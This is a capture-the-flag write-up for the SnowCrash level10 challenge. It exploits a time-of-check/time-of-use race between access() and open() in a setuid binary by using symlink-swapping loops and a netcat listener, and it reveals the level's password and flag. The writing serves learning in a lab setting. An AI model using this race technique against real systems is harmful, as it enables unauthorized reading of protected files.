```
level10@SnowCrash:~$ ls
level10  token

level10@SnowCrash:~$ ./level10 
./level10 file host
        sends file to host if you have access to it

level10@SnowCrash:~$ strings ./level10
...
open
access
...
Connecting to %s:6969 .. 
...
```

The strings command shows that the executable connects to the port 6969.  
It also shows that the executable uses the functions open and access which creates a race condition that can be exploited.  

```
level10@SnowCrash:~$ man 2 access
Warning:  Using  access()  to check if a user is authorized to, for example, open a file before actually doing so using open(2) creates a security hole, because the user might exploit the short time interval between checking and opening the file to manipulate it.  For this reason, the use  of this  system  call  should be avoided.  (In the example just described, a safer alternative would be to temporarily switch the process's effective user ID to the real ID and then call open(2).)
```

During the small time between these 2 calls, we can modify the targeted file to the desired file that we want to access with a symlink.

First of all, let's use netcat to listen to the port 6969.

```
level10@SnowCrash:~$ nc -lk 6969
```

In an other window, we launch the script symlink.sh that, in an infinite loop, will create a file to be accessed by the executable then promptly deleted to be replaced by a symlink of the file token just before the program opens the file.

```
scp -P 4242 symlink.sh level10@XX.XX.XXX.XX:/tmp

level10@SnowCrash:~$ sh /tmp/symlink.sh

```

In a final window, we launch the script password.sh that, also in an infinite loop, will execute ./level10 with the file /tmp/link, created in the previous script, which at certain times will be the symlink of the file token.

```
scp -P 4242 password.sh level10@XX.XX.XXX.XX:/tmp

level10@SnowCrash:~$ sh /tmp/password.sh
...
You don't have access to /tmp/link
You don't have access to /tmp/link
You don't have access to /tmp/link
You don't have access to /tmp/link
Connecting to 127.0.0.1:6969 .. Connected!
Sending file .. wrote file!
You don't have access to /tmp/link
You don't have access to /tmp/link
You don't have access to /tmp/link
You don't have access to /tmp/link
Connecting to 127.0.0.1:6969 .. Connected!
Sending file .. Damn. Unable to open file
You don't have access to /tmp/link
You don't have access to /tmp/link
You don't have access to /tmp/link
You don't have access to /tmp/link
...
```

Now, if we look back at the first window:

```
...
.*( )*.
.*( )*.
.*( )*.
.*( )*.
woupa2yuojeeaaed06riuj63c
.*( )*.
.*( )*.
.*( )*.
.*( )*.
...
^C

level10@SnowCrash:~$ su flag10
Password: 
Don't forget to launch getflag !

flag10@SnowCrash:~$ getflag
Check flag.Here is your token : feulo4b72j7edeahuete3no7c
```